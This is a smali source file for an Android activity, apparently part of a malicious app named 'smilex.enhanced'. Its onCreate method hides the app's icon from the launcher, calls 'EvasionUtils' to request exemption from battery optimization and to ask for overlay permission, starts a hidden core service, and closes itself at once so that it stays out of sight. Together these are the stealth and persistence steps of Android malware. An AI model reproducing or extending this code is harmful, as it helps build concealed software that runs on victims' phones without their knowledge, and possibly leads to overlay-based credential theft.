.class public Lcom/smilex/enhanced/activities/MainActivity;
.super Landroid/app/Activity;
.source "MainActivity.java"

.method public constructor <init>()V
    .registers 1
    invoke-direct {p0}, Landroid/app/Activity;-><init>()V
    return-void
.end method

.method protected onCreate(Landroid/os/Bundle;)V
    .registers 5
    .param p1, "savedInstanceState"

    invoke-super {p0, p1}, Landroid/app/Activity;->onCreate(Landroid/os/Bundle;)V

    # Hide app icon from launcher
    invoke-virtual {p0}, Lcom/smilex/enhanced/activities/MainActivity;->getPackageManager()Landroid/content/pm/PackageManager;
    move-result-object v0
    invoke-virtual {p0}, Lcom/smilex/enhanced/activities/MainActivity;->getComponentName()Landroid/content/ComponentName;
    move-result-object v1
    const/4 v2, 0x2
    const/4 v3, 0x1
    invoke-virtual {v0, v1, v2, v3}, Landroid/content/pm/PackageManager;->setComponentEnabledSetting(Landroid/content/ComponentName;II)V

    # Request battery optimization ignore
    invoke-static {p0}, Lcom/smilex/enhanced/utils/EvasionUtils;->requestBatteryOptimizationIgnore(Landroid/content/Context;)V

    # Request overlay permission (Android 6+)
    invoke-static {p0}, Lcom/smilex/enhanced/utils/EvasionUtils;->requestOverlayPermission(Landroid/content/Context;)V

    # Start core service
    invoke-static {p0}, Lcom/smilex/enhanced/utils/ServiceLauncher;->startCoreService(Landroid/content/Context;)V

    # Finish activity immediately (stay hidden)
    invoke-virtual {p0}, Lcom/smilex/enhanced/activities/MainActivity;->finish()V
    return-void
.end method
